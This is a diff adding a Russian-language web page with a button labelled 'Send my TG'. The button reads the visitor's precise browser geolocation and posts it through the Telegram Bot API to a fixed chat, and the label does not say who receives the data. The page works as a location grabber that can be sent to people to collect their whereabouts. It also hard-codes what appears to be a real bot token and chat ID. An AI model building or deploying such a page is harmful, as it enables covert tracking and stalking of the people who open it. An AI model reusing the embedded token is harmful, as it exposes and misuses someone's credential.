@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Отправка локации в Telegram</title>
+</head>
+<body>
+    <button onclick="sendLocation()">Отправить мой TG </button>
+    <p id="status">Нажмите кнопку и разрешите доступ к геолокации</p>
+
+    <script>
+        // !!! ЗАМЕНИТЕ ЭТИ ДАННЫЕ !!!
+        const BOT_TOKEN = '7809741703:AAF-bziX96f0a59ryK2aPlIQwIyNx03iDb8'; // Например: '654321:AAEeZzUQvJQfS8D9eR5tT4yY7uI2oP1lK'
+        const CHAT_ID = '7385367312'; // Например: '123456789'
+
+        async function sendLocation() {
+            const status = document.getElementById("status");
+            
+            if (!navigator.geolocation) {
+                status.textContent = "Ваш браузер не поддерживает геолокацию";
+                return;
+            }
+            
+            status.textContent = "Определяем ваше местоположение...";
+            
+            try {
+                // Получаем координаты
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000
+                    });
+                });
+                
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                
+                // Отправляем через Telegram API
+                const response = await fetch(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`
+                );
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    status.innerHTML = "✅ Локация отправлена!<br>Проверьте Telegram";
+                } else {
+                    status.textContent = "Ошибка Telegram: " + result.description;
+                }
+            } catch (error) {
+                status.textContent = "Ошибка: " + (
+                    error.code === 1 ? "Вы запретили доступ к геолокации" :
+                    error.message.includes("Failed to fetch") ? "Нет интернета" :
+                    "Не удалось отправить данные"
+                );
+            }
+        }
+    </script>
+</body>
+</html>
